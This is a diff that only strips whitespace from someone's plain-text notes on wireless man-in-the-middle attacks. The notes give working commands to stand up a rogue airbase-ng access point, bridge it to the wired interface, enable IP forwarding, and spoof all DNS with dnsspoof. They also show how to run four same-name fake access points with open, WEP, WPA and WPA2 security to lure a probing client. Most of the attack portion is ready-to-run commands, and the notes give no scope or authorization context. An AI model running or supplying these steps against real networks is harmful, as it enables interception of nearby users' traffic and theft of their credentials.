@@ -14,16 +14,16 @@
 
  # airbase-ng --essid masum-mitm -c 11 wlan0mon
 
-2. now set the bridge interface and add the wire and wireless interface 
+2. now set the bridge interface and add the wire and wireless interface
 ... we have added our eth0 and at0 to the bridge interface masum-bridge.
 
- # brctl addbr masum-bridge 
+ # brctl addbr masum-bridge
  # brctl addif masum-bridge eth0
- # brctl addif masum-bridge at0 
+ # brctl addif masum-bridge at0
  # ifconfig eth0 0.0.0.0 up
  # ifconfig at0 0.0.0.0 up
 
-3. now if any dhcp server running in lan or in attacke machine he can 
+3. now if any dhcp server running in lan or in attacke machine he can
 ... ask for the dhcp ip or he can manually set ip for the masum-bridge
 ... interface.
 
@@ -31,10 +31,10 @@
  # ifconfig masum-bridge 192.168.1.10 up
 
 4. turn on the ip forwarding
- 
+
  # echo 1 > /proc/sys/net/ipv4/ip_forward
 
-... now if any client connect to this at0 fake ap we can see from the 
+... now if any client connect to this at0 fake ap we can see from the
 ... airbase-ng command terminal. if we run wireshark on at0 interface
 ... then we can see that a lot of communication is going on.
 
@@ -45,15 +45,15 @@
 ... through attacker machine. what attacker can do at this stage is spoof
 ... dns and redirect all the dns request toward attacker machine.
 
- # dnsspoof -i masum-bridge 
+ # dnsspoof -i masum-bridge
 
-... this command will spoof all dns request and point toward the attacker 
+... this command will spoof all dns request and point toward the attacker
 ... machine.
 
 .... configuring numerous ap with different security configuration.
 
 ... say by airodump-ng command we have found that one client is looking for
-... an ap which he has connected before. but we dont know at that time what 
+... an ap which he has connected before. but we dont know at that time what
 ... was the security configuration like open or wep or wpa psk or wpa2 psk.
 
 ... one of the solution is to create four ap with different security config.
@@ -61,16 +61,16 @@
  # airmon-ng start wlan0
 
 ... run the above command for several times to create monitor interface like
-... mon0, mon1, mon2, mon3. and then run the following command to create 
+... mon0, mon1, mon2, mon3. and then run the following command to create
 ... ap with differenet security config.
 
  # airbase-ng --essid "Rokeya" -a AA:AA:AA:AA:AA:AA -c 3 mon0
 
-... above is for the open ap 
+... above is for the open ap
 
  # airbase-ng --essid "Rokeya" -a BB:BB:BB:BB:BB:BB -W 1 -c 3 mon1
 
-... above for the wep. 
+... above for the wep.
 
 ... similary following is for wpa psk
 
@@ -79,11 +79,3 @@
 ... the following is for the wpa2-psk
 
  # airbase-ng --essid "Rokeya" -a DD:DD:DD:DD:DD:DD -W 1 -Z 2 -c 3 mon3
-
-
-
-
-
-
-
-
